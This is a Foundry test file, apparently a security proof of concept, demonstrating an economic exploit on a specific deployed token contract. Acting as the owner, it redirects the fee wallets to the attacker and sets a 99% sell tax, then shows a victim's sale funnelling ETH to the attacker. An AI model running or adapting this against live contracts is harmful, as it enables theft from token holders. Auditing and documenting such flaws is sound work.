// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TokenTool {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (address);
    function transfer(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint) external returns (bool);
    function setMarketingWalletAddress(address payable) external;
    function setTeamWalletAddress(address payable) external;
    function setSelTaxes(uint256, uint256, uint256) external;
    function setNumTokensBeforeSwap(uint256) external;
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
    address attacker = address(this);
    TokenTool private token;
    IUniswapV2Router02 private router;
    address private owner;
    address private victim;
    address private weth;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = TokenTool(TARGET);
        router = IUniswapV2Router02(token.uniswapV2Router());
        weth = router.WETH();
        owner = token.owner();
        victim = makeAddr("victim");

        // Attacker buys some tokens to add initial liquidity and get tokens
        deal(attacker, 10 ether);
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(token);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Send some tokens to the victim
        uint256 amountToVictim = token.balanceOf(attacker) / 2;
        token.transfer(victim, amountToVictim);

        // Set attacker's initial ETH to 0 for clean profit calculation
        deal(attacker, 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = attacker.balance;

                // Attacker (as owner) sets up the trap
                vm.startPrank(owner);
                token.setMarketingWalletAddress(payable(attacker));
                token.setTeamWalletAddress(payable(attacker));
                token.setSelTaxes(33, 33, 33); // 99% sell tax
                token.setNumTokensBeforeSwap(1); // Ensure swapAndLiquify triggers
                vm.stopPrank();

                // Victim sells their tokens, which loads up the contract with fee tokens
                uint256 victimBalance = token.balanceOf(victim);
                vm.startPrank(victim);
                token.approve(address(router), victimBalance);

                address[] memory path = new address[](2);
                path[0] = address(token);
                path[1] = weth;

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    victimBalance,
                    0,
                    path,
                    victim,
                    block.timestamp
                );
                vm.stopPrank();

                // Now, trigger swapAndLiquify by performing a small transfer.
                // This will process the fees collected from the victim's swap.
                token.transfer(makeAddr("dummy"), 1);

                // Attacker has now received the fees in ETH
                assertGt(attacker.balance, initialBalance, "Economic Exploit Failed: No profit");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

